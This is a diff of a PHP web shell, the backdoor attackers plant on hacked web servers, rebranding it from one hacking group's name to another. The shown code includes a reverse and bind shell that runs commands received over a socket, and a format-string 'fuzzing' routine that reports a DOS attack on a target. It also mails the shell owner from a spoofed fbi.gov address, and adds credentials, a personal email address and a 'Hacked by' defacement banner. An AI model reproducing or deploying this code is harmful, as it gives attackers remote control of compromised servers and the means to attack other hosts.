@@ -1,13 +1,13 @@
 <?php
 /*
 []========================================
-[]--------------Cks Shell-----------------
+[]--------------Trkn Shell----------------
 []----------------------------------------
 []========================================
-[]>>>>>>>>> cyber king Squad <<<<<<<<<<
+[]>trhacknon anonymous red hat hacker<<<<<
 []========================================
-[]+  Telegram: https://t.me/cks_community         +
-[]+  Facebook: Cyber king Squad   +
+[]+  Telegram: https://t.me/trkn         +
+[]+  trhacknon anonymous red hat         +
 []========================================
 []
 []
@@ -18,8 +18,8 @@
 []
 []
 []
-[]  cyber king Squad
-[]  Live for Bangladesh
+[]  Trhacknon anonymous red hat hacker
+[]  Live for ukaine
 []
 []
    
@@ -85,13 +85,13 @@ if(isset($_GET['zip'])) {
 
 /**************** Defines *********************************/
 
-$greeting 		= "Welcome CKS Shell";
-$user 			= "CKS";
-$pass 			= "Rh077king";
+$greeting 		= "Welcome in trhacknon Shell";
+$user 			= "trhacknon";
+$pass 			= "trhacknon";
 $lock 			= "on"; // set this to off if you dont need the login page
 $antiCrawler 		= "off"; // set this to on if u dont want your shell to be publicised in Search Engines ! (It increases the shell's Life')
-$tracebackFeature 	= "off"; // set this feature to on to enable email alerts
-$ownerEmail 		= ":)(:"; // Change this to your email , This email is used to deliver tracebacks about your shell
+$tracebackFeature 	= "on"; // set this feature to on to enable email alerts
+$ownerEmail 		= "jeremydiliotti@gmail.com"; // Change this to your email , This email is used to deliver tracebacks about your shell
 $url 			= (!empty($_SERVER['HTTPS'])) ? "https://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'] : "http://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];
 $phpVersion		= phpversion();
 $self			= $_SERVER["PHP_SELF"]; // Where am i
@@ -120,17 +120,17 @@ function sendLoginAlert()
     global $url;
     $accesedIp = $_SERVER['REMOTE_ADDR'];
     $randomInt = rand(0,1000000);           # to avoid id blocking
-    $from = "Cks-shell$randomInt@fbi.gov"; 
+    $from = "trkn-shell$randomInt@fbi.gov"; 
     
     //echo $from;
     
     if(function_exists('mail'))
     {
-        $subject = "Shell Accessed -- Cks-Shell --";
+        $subject = "Shell Accessed -- trkn-Shell --";
         $message = "
 Hey Owner ,
         
-        Your Shell(Cks-Shell) located at $url was accessed by $accesedIp
+        Your Shell(trkn-Shell) located at $url was accessed by $accesedIp
         
         If its not you :-
         
@@ -141,7 +141,7 @@ Hey Owner ,
         Thanking You
         
 Yours Faithfully
-Cks-Shell
+Trkn-Shell
         ";
         mail($ownerEmail,$subject,$message,'From:'.$from);
     }
@@ -205,7 +205,7 @@ else
 ?>
 <html>
 <head>
-<title>Cks-Shell | Bangladesh</title>
+<title>trkn-Shell | anonymous</title>
 <style type="text/css"> body { background-image: url('https://media.tumblr.com/c838dd887608a325eaae477ffa4dd2b7/tumblr_myrxsem7AC1s8tqb9o1_500.gif'); -webkit-background-size: cover; -moz-background-size: cover; -o-background-size: cover; background-size: cover; background-position:center; 	background-repeat: no-repeat; background-color: #000000; 		 color: #FFFFFF; 	 font-family: "Orbitron"; 	 text-align: center; 	 text-decoration: none; 	} 	 #greets { 		width: 820px; 		border-style: outset; 	} #footer { 		font-size: 9pt; 		opacity: .7; 	} 	 	.glow { 	 text-shadow: 0 0 10px #F59700; 		font-family: "Black Ops One"; 	} 	 .blueglow { 		text-shadow:0px 0px 1px aqua,0px 0px 1px aqua,0px 0px 1px red,0px 0px 1px red,0px 0px 1px red,0px 0px 1px red,0px 0px 1px red,0px 0px 1px red,0px 0px 1px red,0px 0px 1px red,0px 0px 1px red,0px 0px 1px aqua; 		font-family: "Black Ops One" 	} 	 	 .redglow { 		text-shadow: 0 0 10px yellow; 		font-family: "Black Ops One" 	} 	 	 .whiteglow { 	text-shadow:0px 0px 1px green,0px 0px 1px green,0px 0px 1px aqua,0px 0px 1px green,0px 0px 1px red,0px 0px 1px red,0px 0px 1px red,0px 0px 1px red,0px 0px 1px red,0px 0px 1px red,0px 0px 1px red,0px 0px 1px green; 		font-family: "Black Ops One"; 	} </style>
 <?php
 if($antiCrawler != 'off')
@@ -465,17 +465,17 @@ if($lock == 'on' && (!isset($_SESSION['authenticated']) || $_SESSION['authentica
         <tr>
             <td width="500px">
         <pre>
-<center><a href=><img src=https://c.top4top.io/p_2108ecrrq3.png height=200 width=200 alt="Hacked by CKS" /></a><br>
+<center><a href=><img src=https://b.top4top.io/p_2280mvkvg0.jpg height=200 width=200 alt="Hacked by trhacknon" /></a><br>
 <font color="#198944">
 <b>
 []========================================
-[]--------------Cks Shell-----------------
+[]--------------trkn Shell----------------
 []----------------------------------------</font><font color="Red">
 []========================================
-[]>>>>>>>>>> Cyber king Squad <<<<<<<<<<<<
+[]>>>>>>>>> trhacknon anonymous <<<<<<<<<<
 []========================================</font><font color="#0f9a54">
-[]>>>Telegram:cks_community  <<<<<<<<<<<<+
-[]>>>Facebook : Cyber king Squad<<<<<<<<<+
+[]>>anonymous red hat hacker <<<<<<<<<<<<+
+[]>>>we dont forget ! we dont forgive !<<+
 []========================================</font><font color="grey">
 
 </b></center>
@@ -1569,7 +1569,7 @@ else if(isset($_GET['connect']))
         } 
         else
         { 
-            fputs ($sockfd ,"\n=================================================================\nCks-Shell  | Bangladesh\n=================================================================");
+            fputs ($sockfd ,"\n=================================================================\ntrkn-Shell  | anonymous\n=================================================================");
          $pwd = exec_all("pwd");
          $sysinfo = exec_all("uname -a");
          $id = exec_all("id");
@@ -1581,7 +1581,7 @@ else if(isset($_GET['connect']))
          fputs($sockfd ,$dateAndTime."\n\n" );
          while(!feof($sockfd))
          {  
-            $cmdPrompt ="(Cks-Shell)[$]> ";
+            $cmdPrompt ="(trkn-Shell)[$]> ";
             fputs ($sockfd , $cmdPrompt ); 
             $command= fgets($sockfd, $len);
             fputs($sockfd , "\n" . exec_all($command) . "\n\n");
@@ -1691,7 +1691,7 @@ else if(isset($_GET['connect']))
             while(1)
             {
                 // Print Command prompt
-                $commandPrompt ="(Cks-Shell)[$]> ";
+                $commandPrompt ="(trkn-Shell)[$]> ";
                 $maxCmdLen = 31337;
                 socket_write($client,$commandPrompt);
                 $cmd = socket_read($client,$maxCmdLen);
@@ -1825,7 +1825,7 @@ else if(isset($_GET['fuzz']))
             $data .= urlencode($_GET['message']);
         }
         $data .= "%s%s%s%s%d%x%c%n%n%n%n";// add some format string specifiers
-        $data .= "by-Cks-shell".$ending;
+        $data .= "by-trkn-shell".$ending;
         $length = strlen($data);
         
         
@@ -1841,7 +1841,7 @@ else if(isset($_GET['fuzz']))
                 fclose($socket);
             }
         }
-        echo "<script>alert('Fuzzing Completed!By CKS');</script>";
+        echo "<script>alert('Fuzzing Completed!By trkn');</script>";
         echo "DOS attack against $mode://$IP:$port completed on ".date("h:i:s A")."<br />";
         echo "Total Number of Packets Sent : " . $times . "<br />";
         echo "Total Data Sent = ". HumanReadableFilesize($times*$length) . "<br />"; 
@@ -2458,8 +2458,8 @@ else
 
 <div class="end" id='footer' style="margin-top: 10px;">
 <p align="center"><b>Copyright[All rights reserved]</b><br />
-(: <a href="https://t.me/cks_community">Follow Team</a> | <a href="https://www.facebook.com/106457414408853">Facebook</a> :)<br>
-<font face="courier new" color="#ed68fd" size="7">(Greetz To)</font><br> <font face="courier new" color="#00ff1f"size="6">Rh077king ,RRhax077king,Rhax077king,Dark077Vau,D34TH4X0R,N4Y3M07,D4rk-3y3, and all CKS Members! We'll Always rock <br>Cyber king Squad</font>
+(: <a href="http://tndevsec.cf">Follow Team</a> | <a href="https://www.facebook.com">Facebook</a> :)<br>
+<font face="courier new" color="#ed68fd" size="7">(Greetz To)</font><br> <font face="courier new" color="#00ff1f"size="6">trhacknon , and all trhacknon friends! We'll Always rock <br>trhacknon anonymous red hat hacker</font>
 </p>
 </div>
 
